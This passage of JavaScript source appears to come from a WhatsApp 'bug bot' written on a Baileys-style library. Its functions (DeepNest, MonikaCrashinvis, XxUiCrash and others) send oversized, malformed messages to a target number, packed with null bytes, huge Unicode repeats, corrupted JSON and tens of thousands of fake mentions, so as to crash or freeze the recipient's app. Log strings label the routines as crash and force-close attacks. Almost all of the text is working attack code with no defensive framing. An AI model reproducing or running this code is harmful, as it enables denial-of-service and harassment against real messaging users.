          mentionedJid: Array.from({ length: 1900 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
        },
        scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
        scanLengths: [3599, 9271, 2026, 2778],
        midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=",
        annotations: [
          {
            polygonVertices: [
              { x: "0.05515563115477562", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.5867812633514404" },
              { x: "0.05515563115477562", y: "0.5867812633514404" }
            ],
            newsletter: {
              newsletterJid: "120363399602691477@newsletter",
              serverMessageId: 3868,
              newsletterName: "$",
              contentType: "UPDATE_CARD",
              accessibilityText: "\u0000".repeat(5000)
            }
          }
        ]
      }
    };

    const msg1 = generateWAMessageFromContent(target, stickerPayload, {});
    const msg2 = generateWAMessageFromContent(target, audioPayload, {});
    const msg3 = generateWAMessageFromContent(target, imagePayload, {});

    await vinzzoffc.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    await vinzzoffc.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    await vinzzoffc.relayMessage("status@broadcast", msg3.message, {
      messageId: msg3.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    const msg4 = {
      viewOnceMessage: {
        message: {
          groupMentionMessage: {
            message: {
              interactiveResponseMessage: {
                contextInfo: {
                  remoteJid: "target",
                  mentionedJid: ["13135559098@s.whatsapp.net"],
                },
                body: {
                  text: "🩸",
                  format: "DEFAULT",
                },
                nativeFlowResponseMessage: {
                  name: "address_message",
                  paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"dvx","phone_number":"+131358790202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
                  version: 3,
                },
              },
            },
          },
        },
      },
    };

    const msg5 = {
      interactiveMessage: {
        header: {
          locationMessage: {
            degreesLatitude: 9999999999,
            degreesLongitude: -9999999999,
            name: "ꦽ".repeat(15000) + "\0".repeat(15000),
            address: "$" + "{".repeat(30000),
            comment: "ꦾ".repeat(10000),
          },
        },
      },
    };

    const messages = [msg4, msg5];
    for (const msg of messages) {
      await vinzzoffc.relayMessage("status@broadcast", msg, {
        messageId: undefined,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }],
              },
            ],
          },
        ],
      });
    }

    const mentions = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 1900 }, () =>
            "1" + Math.floor(Math.random() * 500000000) + "@s.whatsapp.net"
        )
    ];

    const mediaDatamrb = [
        {
            ID: "68BD677B",
            uri: "t62.43144-24/10000000_1407285833860834_2249780575933148603_n.enc?ccb=11-4&oh",
            buffer: "01_Q5Aa2AFffQpqWVK7GvldUiQQNd4Li_6BbUMZ3yHwZ55g5SuVKA&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "o+hchsgN0ZtdSp8iBlD1Yb/kx9Mkrer8km3pw5azkj0=",
            mkey: "C+7Uy3QyEAHwMpIR7CGaKEhpZ3KYFS67TcYxcNbm73EXo=",
        },
        {
            ID: "68BD469B",
            uri: "t62.43144-24/10000000_2553936021621845_4020476590210043024_n.enc?ccb=11-4&oh",
            buffer: "01_Q5Aa2AHPt6cTL57bihyVMMppUvQiXg-m7Oog3TAebzRVWsCNEw&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "2cGzUZDAYCZq7QbAoiWSI1h5Z0WIje7VK1IiUgqu/+Y=",
            mkey: "1EvzGhM2IL78wiXyfpRrcr8o0ws/hTjtghBQUF+v3wI=",
        },
    ];

    const mediaData2mrb = [
        {
            ID: "69680D38",
            uri: "t62.43144-24/10000000_790307790709311_669779370012050552_n.enc?ccb=11-4&oh",
            buffer: "11-4&oh=01_Q5Aa3QGnIg1qMpL5Isc7LmIdU1IpoFsCqXialsd2OW2w0QQyUw&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "7ovcifxdIivWXIJgLvrRtPfs+pPXen7hoXtnoFKdP4s=",
            mkey: "Wql96TBHCa44YVS6eAlHGI6aYIYg6yc0kuOr0Y9WvtI=",
        },
        {
            ID: "69680D38",
            uri: "t62.43144-24/10000000_1534257120961824_1506742782412655205_n.enc?ccb=11-4&oh",
            buffer: "11-4&oh=01_Q5Aa3QEE7wUPnOULMZhlwnOw_bhHK6Gn7YI0hKpVm3yvw5dGMw&oe",
            sid: "5e03e0",
            SHA256: "I2ky6mhJmsFYmA+XRBoiaiTeYwnXGQAVXym+P/9YN6Y=",
            ENCSHA256: "HyfU2MhgxBQFFIohXT68RNZa0MAZRxDYB4X1c3I7JQY=",
            mkey: "Q5V7iUFs67ewh1qOOkqwQ9avc3u7qXAhyh2fIgVITCU=",
        },
        {
            ID: "696C0CE0",
            uri: "t62.43144-24/10000000_1897784937438799_7647459696855315586_n.enc?ccb=11-4&oh",
            buffer: "01_Q5Aa3QGNjK1V4UGLF19HxU16vRNPFJQjy64pYSFbsuEm6bySdw&oe",
            sid: "5e03e0",
            SHA256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
            ENCSHA256: "RA4VN83TrKamnTjEolURSU7+2UUDY28EFBBQvFNh7e4=",
            mkey: "dTMN5/4/mFir4PcfgezcrIXqigJ8pl/COUQMxUsTaac=",
        },
    ];

    const extendedMsg = {
        extendedTextMessage: {
            text: "$$$$$",
            locationMessage: {
                degressLatitude: 617267,
                degressLongitude: -6172677,
                isLive: true,
                accuracyInMetters: 100,
                jpegThumbnail: null,
            },
            contextInfo: {
                forwardingScore: 9471,
                isForwarded: true,
                mentionedJid: mentions,
                participant: target,
                stanzaId: target,
                entryPointConversionSource: "notification",
                remoteJid: target,
            },
            messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 3,
            },
        },
        mediaData: [...mediaDatamrb, ...mediaData2mrb],
    };

    await vinzzoffc.relayMessage(target, {
        groupStatusMessageV2: {
            message: extendedMsg
        }
    }, {
        participant: { jid: target }
    });
  } catch (err) {
    console.error("❌ Error di:", err);
  }
}

async function LoocDepong(vinzzoffc, target) {
  let msg2 = {
    clientPayload: {
      clientFeature: {
        featureFlags: 0xFFFFFFFF,
        maxReceiveSize: 9999999999,
        maxSendSize: 9999999999,
        userAgent: {
          appVersion: { primary: 9999, secondary: 9999, tertiary: 9999, quaternary: 9999 },
          platform: 99,
          osVersion: "X".repeat(30000),
          manufacturer: "Y".repeat(30000),
          device: "Z".repeat(30000)
        },
        connectType: 999,
        connectReason: 999
      },
      connect: { connectTimeMs: 9999999999, connectAttempts: 999 },
      dn: "A".repeat(50000),
      passive: true
    }
  };

  await vinzzoffc.relayMessage(target, msg2, { participant: { jid: target } });
}

async function DeepNest(vinzzoffc, target) {
  try {

    const LanggXzzzz = JSON.stringify({
      status: true,
      criador: "AsepNotDev",
      timestamp: Date.now(),
      noise: "}".repeat(1000000), // 1 juta karakter
      resultado: {
        type: "md",
        dummyRepeat: Array(100).fill({
          id: "Asep Is Here" + Math.random(),
          message: "\u200f".repeat(5000),
          crash: {
            deepLevel: {
              level1: {
                level2: {
                  level3: {
                    level4: {
                      level5: {
                        loop: Array(50).fill("🪷".repeat(500))
                      }
                    }
                  }
                }
              }
            }
          }
        }),
        ws: {
          _events: {
            "CB:ib,,dirty": ["Array"]
          },
          _eventsCount: -98411,
          _maxListeners: Infinity,
          url: "wss://web.whatsapp.com/ws/chat",
          config: {
            version: new Array(500).fill([99, 99, 99]),
            browser: new Array(100).fill(["Chrome", "Linux"]),
            waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
            sockCectTimeoutMs: 100,
            keepAliveIntervalMs: 10,
            logger: {
              logs: Array(1000).fill("Asep Is Here")
            },
            spam: Array(1000).fill("🪺").join(""),
            auth: { Object: "authData" },
            crashTrigger: {
              nullField: null,
              undefinedField: undefined,
              boolSwitch: [true, false, false, true, null],
              crazyArray: new Array(10000).fill(Math.random())
            },
            mobile: true
          }
        }
      }
    })

    const generateLocationMessage = {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -999.035,
            degreesLongitude: 922.999999999999,
            name: "ꦾ".repeat(10000),
            address: "\u200f",
            nativeFlowMessage: {
              messageParamsJson: "}".repeat(100000),
            },
            contextInfo: {
              mentionedJid: [
                target,
                ...Array.from({ length: 40000 }, () =>
                  "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                )
              ],
              isSampled: true,
              participant: target,
              remoteJid: "status@broadcast",
              forwardingScore: 9741,
              isForwarded: true
            }
          }
        }
      }
    }

    const msg = generateWAMessageFromContent("status@broadcast", generateLocationMessage, {})

    await vinzzoffc.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: LanggXzzzz,
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }, {
      participant: target
    })

  } catch (err) {
    console.error("Gagal kirim Bug:\n", err)
  }
}

async function MonikaCrashinvis(vinzzoffc, target) {
  try {
    const mentionedMetaAi = [
      "13135550001@s.whatsapp.net", "13135550002@s.whatsapp.net",
      "13135550003@s.whatsapp.net", "13135550004@s.whatsapp.net",
      "13135550005@s.whatsapp.net", "13135550006@s.whatsapp.net",
      "13135550007@s.whatsapp.net", "13135550008@s.whatsapp.net",
      "13135550009@s.whatsapp.net", "13135550010@s.whatsapp.net"
    ];
    const metaSpam = Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`);
    const textSpam = "᬴".repeat(250000);
    const mentionSpam = Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);
    const invisibleChar = '\u2063'.repeat(500000) + "@0".repeat(50000);
    const contactName = "🩸⃟ ༚ ༄𝑻𝒉𝒆𝑮𝒍𝒐𝑭𝒂𝒓𝒕𝑮𝒐࿐᭄ཀ͜͡🦠-‣";
    const triggerChar = "𑇂𑆵𑆴𑆿".repeat(60000);
    const contactAmount = 200;
    const corruptedJson = "{".repeat(500000);
    const mention40k = Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`);
    const mention16k = Array.from({ length: 1600 }, () => `${Math.floor(1e11 + Math.random() * 9e11)}@s.whatsapp.net`);
    const randomMentions = Array.from({ length: 10 }, () => "0@s.whatsapp.net");

    await vinzzoffc.relayMessage(target, {
      orderMessage: {
        orderId: "120363403323478184",
        thumbnail: { url: "https://files.catbox.moe/pwo962.jpg" },
        itemCount: 9999999999,
        status: "INQUIRY",
        surface: "CATALOG",
        message: `${'ꦾ'.repeat(60000)}`,
        orderTitle: "🩸⃟ ༚ ༄𝑻𝒉𝒆𝑮𝒍𝒐𝑭𝒂𝒓𝒕𝑮𝒐࿐᭄ཀ͜͡🦠-‣",
        sellerJid: "5521992999999@s.whatsapp.net",
        token: "Ad/leFmSZ2bEez5oa0i8hasyGqCqqo245Pqu8XY6oaPQRw==",
        totalAmount1000: "9999999999",
        totalCurrencyCode: "USD",
        messageVersion: 2,
        viewOnce: true,
        contextInfo: {
          mentionedJid: [target, ...mentionedMetaAi, ...metaSpam],
          externalAdReply: {
            title: "ꦾ".repeat(20000),
            mediaType: 2,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            containsAutoReply: true,
            body: "©༄𝑻𝒉𝒆𝑮𝒍𝒐𝑭𝒂𝒓𝒕𝑮𝒐࿐᭄",
            thumbnail: { url: "https://files.catbox.moe/pwo962.jpg" },
            sourceUrl: "about:blank",
            sourceId: vinzzoffc.generateMessageTag(),
            ctwaClid: "ctwaClid",
            ref: "ref",
            clickToWhatsappCall: true,
            ctaPayload: "ctaPayload",
            disableNudge: false,
            originalimgLink: "about:blank"
          },
          quotedMessage: {
            callLogMesssage: {
              isVideo: true,
              callOutcome: 0,
              durationSecs: "9999",
              callType: "VIDEO",
              participants: [{ jid: target, callOutcome: 1 }]
            }
          }
        }
      }
    }, {});

    await vinzzoffc.sendMessage(target, {
      text: textSpam,
      contextInfo: { mentionedJid: mentionSpam }
    }, { quoted: null });

    await vinzzoffc.relayMessage(target, {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 9999,
                degreesLongitude: 9999
              },
              hasMediaAttachment: true
            },
            body: { text: invisibleChar },
            nativeFlowMessage: {},
            contextInfo: { mentionedJid: randomMentions }
          },
          groupStatusMentionMessage: {
            groupJid: target,
            mentionedJid: randomMentions,
            contextInfo: { mentionedJid: randomMentions }
          }
        }
      }
    }, {
      participant: { jid: target },
      messageId: undefined
    });

    const contacts = Array.from({ length: contactAmount }, () => ({
      displayName: `${contactName + triggerChar}`,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${contactName};;;\nFN:${contactName}\nitem1.TEL;waid=5521986470032:+55 21 98647-0032\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
    }));

    await vinzzoffc.relayMessage(target, {
      contactsArrayMessage: {
        displayName: `${contactName + triggerChar}`,
        contacts,
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true,
          quotedAd: {
            advertiserName: "x",
            mediaType: "IMAGE",
            jpegThumbnail: "" 
          }
        }
      }
    }, {});

    const payloadDelay1 = {
      viewOnceMessage: {
        message: {
          imageMessage: {
            mimetype: "image/jpeg",
            caption: "",
            fileLength: "9999999999999",
            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
            height: 1,
            width: 1,
            jpegThumbnail: Buffer.from("").toString("base64"),
            contextInfo: {
              mentionedJid: mention40k,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          },
          interactiveMessage: {
            header: {
              title: " ".repeat(6000),
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999,
                degreesLongitude: 999,
                name: corruptedJson.slice(0, 100),
                address: corruptedJson.slice(0, 100)
              }
            },
            body: { text: "⟅ ༑ ༄𝑻𝒉𝒆𝑮𝒍𝒐𝑭𝒂𝒓𝒕𝑮𝒐࿐᭄ ༑ ▾" },
            footer: { text: "🩸 ༑ ༄𝑻𝒉𝒆𝑮𝒍𝒐𝑭𝒂𝒓𝒕𝑮𝒐࿐᭄ ༑ 🩸" },
            nativeFlowMessage: { messageParamsJson: corruptedJson },
            contextInfo: {
              mentionedJid: mention40k,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          }
        }
      }
    };

    await vinzzoffc.relayMessage("status@broadcast", payloadDelay1, {
      messageId: null,
      statusJidList: [target]
    });

    await vinzzoffc.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "🩸⃟ ༚ ༄𝑻𝒉𝒆𝑮𝒍𝒐𝑭𝒂𝒓𝒕𝑮𝒐࿐᭄ཀ͜͡🦠-‣",
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/19378731_679142228436107_2772153309284501636_n.enc?ccb=11-4&oh=...",
                mimetype: "image/jpeg",
                caption: "{ null ) } Sigma \u0000 Bokep 100030 caption: bokep",
                height: 819,
                width: 1792,
                jpegThumbnail: Buffer.from("").toString("base64"),
                mediaKey: "WedxqVzBgUBbL09L7VUT52ILfzMdRnJsjUPL0OuLUmQ=",
                mediaKeyTimestamp: "1752001602"
              },
              hasMediaAttachment: true
            },
            body: { text: "🩸⃟ ༚ ༄𝑻𝒉𝒆𝑮𝒍𝒐𝑭𝒂𝒓𝒕𝑮𝒐࿐᭄ཀ͜͡🦠-‣" },
            nativeFlowMessage: {
              buttons: [
                { name: "galaxy_message", buttonParamsJson: "[".repeat(29999) },
                { name: "galaxy_message", buttonParamsJson: "{".repeat(38888) }
              ],
              messageParamsJson: "{".repeat(10000)
            },
            contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA" }
          }
        }
      }
    }, {});

    console.log("Succes Send to target!");

  } catch (err) {
    console.error("❌ Error in function bug:", err);
  }
}

async function JessiForceLst(vinzzoffc, target) {
    try {
        console.log(`📋 [7/7] FORCE - Target: ${target}`);
        
        const sections = [];
        for (let i = 0; i < 500; i++) {
            sections.push({
                title: "👁️SECTION_" + i + "👁️" + OVERFLOW.substring(0, 200),
                rows: [{
                    title: "ROW_" + i + MEMORY_LEAK.substring(0, 500),
                    description: "DESC_" + i + JSON_BOMB.substring(0, 500),
                    rowId: "id_" + i + NULL_BYTES
                }]
            });
        }

        const listPart = await generateWAMessageFromContent(target, {
            listMessage: {
                title: "HAMA LU ANJ" + OVERFLOW,
                description: "@jessioffc" + PATH_TRAVERSAL,
                buttonText: "DESTROY",
                listType: 1,
                sections: sections,
                footerText: "FORCE CLOSE"
            }
        }, { userJid: target, quoted: null });

        await vinzzoffc.relayMessage(target, listPart.message, { 
            messageId: listPart.key.id 
        });
        
        console.log(`✅ FORCE BERHASIL: ${target}`);
        return { success: true, target: target };
        
    } catch (e) {
        console.log(`❌ FORCE GAGAL: ${e.message}`);
        return { success: false, error: e.message };
    }
}

async function XStromDelayInvisible(vinzzoffc, target, mention) {
  let message = {
    viewOnceMessage: {
      message: {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ" + "ꦾ".repeat(77777),
      publisher: "El Kontole",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "Jawa Jawa",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
     remoteJid: "X",
      participant: "0@s.whatsapp.net",
      stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED",
      quotedMessage: {
      callLogMesssage: {
      isVideo: true,
      callOutcome: "REJECTED",
      durationSecs: "1",
      callType: "SCHEDULED_CALL",
       participants: [
           { jid: target, callOutcome: "CONNECTED" },
               { target: "0@s.whatsapp.net", callOutcome: "REJECTED" },
               { target: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
               { target: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" },
                ]
              }
            },
         },
      },
    },
  };
  
  const msg = generateWAMessageFromContent(target, message, {});

  await vinzzoffc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await vinzzoffc.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "𝐁𝐞𝐭𝐚 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 - 𝟗𝟕𝟒𝟏" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function XxUiCrash(vinzzoffc, target) {
    const msg = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999,
                            businessMessageForwardInfo: {
                                businessOwnerJid: target,
                            },
                        },
                        body: {
                            text: "VISI - XX\\>" + "ោ៝".repeat(20000),
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000),
                        },
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "\u0000".repeat(20000),
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "\u0000".repeat(20000),
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "\u0000".repeat(20000),
                            },
                        ],
                    },
                },
            },
        },
        {}
    );
    
    const msg2 = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "VISI - XX\\>",
                            hasMediaAttachment: false,
                            locationMessage: {
                                degreesLatitude: -999.03499999999999,
                                degreesLongitude: 922.999999999999,
                                name: "VISI - XX\\>",
                                address: "ោ៝".repeat(1000),
                            },
                        },
                        body: {
                            text: "VISI - XX\\>".repeat(20000),
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000),
                        },
                    },
                },
            },
        },
        {}
    );

    await vinzzoffc.relayMessage(target, msg.message, {
        participant: { jid: jid },
        messageId: msg.key.id
    });

    await vinzzoffc.relayMessage(target, msg2.message, {
        participant: { jid: target },
        messageId: msg2.key.id
    });
}

async function UiSystem(vinzzoffc, target) {
  const img = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m239/AQMDTeV5_VA-OBFSuqdqXYX0-53ZJQHkoQR944ZaGcoo_GA4-3_-FypseU9Bi7f5ORRn-BQYL8vbFpfXOmxRdLVz8FkzxTf3SyA11Biz3Q?ccb=9-4&oh=01_Q5Aa2QFfCY7O3IquSb0Fvub083w1zLcGVzWCk-P1hjnUMKeSxQ&oe=68DA0F65&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: Buffer.from("i4ZgOwy4PHQmtxW+VgKPJ0LEE9i7XfAwJYk4DVKnjB4=", "base64"),
    fileLength: "62265",
    height: 1080,
    width: 1080,
    mediaKey: Buffer.from("qaiU0wrsmuE9outTy1QEV8TnPwlNAFS5kqmTLBXBugM=", "base64"),
    fileEncSha256: Buffer.from("Vw0MGUhP27kXt9W4LxnpzzYGrozU8pbzafHsxoegPq8=", "base64"),
    directPath: "/o1/v/t24/f2/m239/AQMDTeV5_VA-OBFSuqdqXYX0-53ZJQHkoQR944ZaGcoo_GA4-3_-FypseU9Bi7f5ORRn-BQYL8vbFpfXOmxRdLVz8FkzxTf3SyA11Biz3Q?ccb=9-4&oh=01_Q5Aa2QFfCY7O3IquSb0Fvub083w1zLcGVzWCk-P1hjnUMKeSxQ&oe=68DA0F65&_nc_sid=e6ed6c",
    mediaKeyTimestamp: "1756530813",
    jpegThumbnail: Buffer.from(
      "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAgMBAAAAAAAAAAAAAAAAAQMCBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADzuFlZHovO7xOj1uUREwAX0yI6XNtOxw93RIABlmFk6+5OmVN9pzsLte4BLKwZYjr6GuJgAAAAJBaD/8QAJhAAAgIBAgQHAQAAAAAAAAAAAQIAAxEQEgQgITEFExQiMkFhQP/aAAgBAQABPwABSpJOvhZwk8RIPFvy2KEfAh0Bfy0RSf2ekqKZL+6ONrEcl777CdeFYDIznIjrUF3mN1J5AQIdKX2ODOId9gIPQ8qLuOI9TJieQMd4KF+2+pYu6tK8/GenGO8eoqQJ0x+6Y2EGWWl8QMQQYrpZ2QZljV4A2e4nqRLaUKDb0jhE7EltS+RqrFTkSx+HrSsrgkjrH4hmhOf4xABP/8QAGBEAAwEBAAAAAAAAAAAAAAAAAREwUQD/2gAIAQIBAT8AmjvI7X//xAAbEQAABwEAAAAAAAAAAAAAAAAAAQIREjBSIf/aAAgBAwEBPwCuSMCSMA2fln//2Q==",
      "base64"
    ),
    contextInfo: {},
    scansSidecar: "lPDK+lpgZstxxk05zbcPVMVPlj+Xbmqe2tE9SKk+rOSLSXfImdNthg==",
    scanLengths: [7808, 22667, 9636, 22154],
    midQualityFileSha256: "kCJoJE5LX9w/KxdIQQgGtkQjP5ogRE6HWkAHRkBWHWQ="
  };

  try {
    await vinzzoffc.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: `blue yungkai!\n` + "\u0000" + "ꦾ".repeat(90000),
                  },
                  carouselMessage: {
                    cards: [
                      {
                        header: {
                          hasMediaAttachment: true,
                          imageMessage: img,
                        },
                        body: {
                          text: "\u0000" + "ꦾ".repeat(900000),
                        },
                        nativeFlowMessage: {
                          buttons: [
                            {
                              name: "cta_url",
                              buttonParamsJson: `{"display_text":"Section ${"ꦾ".repeat(900)}","url":"https://t.me/Jcodeest4r","merchant_url":"https://google.com"}`,
                            },
                            {
                              name: "single_select",
                              buttonParamsJson: `{"title":"Section ${"ꦾ".repeat(900)}","sections":[{"title":"Janda","rows":[]}]}`,
                            },
                            {
                              name: "quick_reply",
                              buttonParamsJson: `{"display_text":"Section ${"ꦾ".repeat(9000)}","title":"Crash","id":".clickme"}`,
